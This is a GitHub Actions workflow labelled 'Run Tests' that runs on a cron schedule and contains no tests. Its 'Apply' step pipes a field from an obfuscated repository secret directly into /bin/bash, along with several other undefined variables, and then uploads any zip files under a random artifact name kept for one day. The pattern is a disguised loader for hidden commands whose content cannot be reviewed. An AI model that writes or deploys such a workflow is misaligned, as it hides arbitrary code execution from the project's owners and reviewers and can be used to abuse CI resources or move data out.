name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '26 4,10,16,22 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply
        env:
          e9204: ${{ secrets.e9204 }}
        run: |
          printf '%s' "$e9204" | jq -r .gcc93386 | /bin/bash
          printf '%s' "$fd46061" | jq -r .zj37644 | /bin/bash
          printf '%s' "$m0" | jq -r .gxh36301 | /bin/bash
          printf '%s' "$oc69" | jq -r .oouc80 | /bin/bash
          printf '%s' "$r2" | jq -r .r53177 | /bin/bash

      - name: Upload output
        uses: actions/upload-artifact@v4
        with:
          name: 6vwK4ko9
          path: "*.zip"
          retention-days: 1
